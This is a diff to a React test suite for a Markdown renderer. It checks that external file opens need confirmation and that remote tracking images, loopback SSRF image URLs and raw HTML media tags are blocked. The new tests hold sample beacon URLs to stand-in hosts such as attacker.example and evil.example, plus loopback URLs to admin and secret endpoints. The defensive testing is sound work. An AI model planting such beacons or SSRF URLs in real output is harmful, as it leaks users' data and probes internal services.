@@ -233,6 +233,10 @@ describe("Codex file citations (#776)", () => {
     expect(container.textContent).not.toContain("codex-file-citation");
 
     fireEvent.click(link);
+    const confirmDialog = await screen.findByRole("dialog", { name: "Confirm external open" });
+    expect(confirmDialog.textContent).toContain("/abs/path/report.xlsx");
+    expect(fs.openPath).not.toHaveBeenCalled();
+    fireEvent.click(screen.getByRole("button", { name: "Open" }));
     await waitFor(() => expect(fs.openPath).toHaveBeenCalledWith("/abs/path/report.xlsx"));
     expect(fs.inspectPath).toHaveBeenCalledWith("/workspace", "/abs/path/report.xlsx");
     expect(openFile).not.toHaveBeenCalled();
@@ -320,4 +324,44 @@ it("blocks remote image loads in untrusted PR prose while preserving the image d
   const { container } = render(<Markdown text="![build screenshot](https://untrusted.example/track.png)" remoteImages={false} />);
   expect(container.querySelector("img")).toBeNull();
   expect(screen.getByText("build screenshot (image blocked)")).toBeTruthy();
+});
+
+describe("S-22: Markdown privacy & raw HTML media stripping", () => {
+  it("defaults remoteImages to false and blocks both remote and loopback images", () => {
+    const { container } = render(
+      <Markdown text={"![beacon](https://attacker.example/leak?t=1)\n\n![ssrf](http://127.0.0.1:8080/admin)"} />,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByText("beacon (image blocked)")).toBeTruthy();
+    expect(screen.getByText("ssrf (image blocked)")).toBeTruthy();
+  });
+
+  it("blocks loopback SSRF images even when remoteImages is explicitly true", () => {
+    const { container } = render(
+      <Markdown text={"![ssrf1](http://127.0.0.1:9999/secret)\n\n![ssrf2](http://localhost:3000/api)\n\n![ssrf3](http://[::1]:8000/x)"} remoteImages />,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByText("ssrf1 (image blocked)")).toBeTruthy();
+    expect(screen.getByText("ssrf2 (image blocked)")).toBeTruthy();
+    expect(screen.getByText(/ssrf3/i).textContent).toMatch(/blocked/i);
+  });
+
+  it("strips raw HTML <picture>, <source srcset>, <video>, <audio>, and <iframe> tags", () => {
+    const rawHtml = [
+      '<picture><source srcset="https://evil.example/leak?secret=1" media="(min-width: 1px)"><img src="https://evil.example/fallback.png" alt="fallback"></picture>',
+      '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video>',
+      '<audio src="https://evil.example/a.mp3"></audio>',
+      '<iframe src="https://evil.example/frame"></iframe>',
+      '<img src="https://evil.example/plain.png" srcset="https://evil.example/2x.png 2x" alt="plain">',
+    ].join("\n\n");
+    const { container } = render(<Markdown text={rawHtml} remoteImages={false} webLinksOnly />);
+    expect(container.querySelector("picture")).toBeNull();
+    expect(container.querySelector("source")).toBeNull();
+    expect(container.querySelector("video")).toBeNull();
+    expect(container.querySelector("audio")).toBeNull();
+    expect(container.querySelector("iframe")).toBeNull();
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.innerHTML).not.toContain("srcset");
+    expect(container.innerHTML).not.toContain("evil.example/leak");
+  });
 });
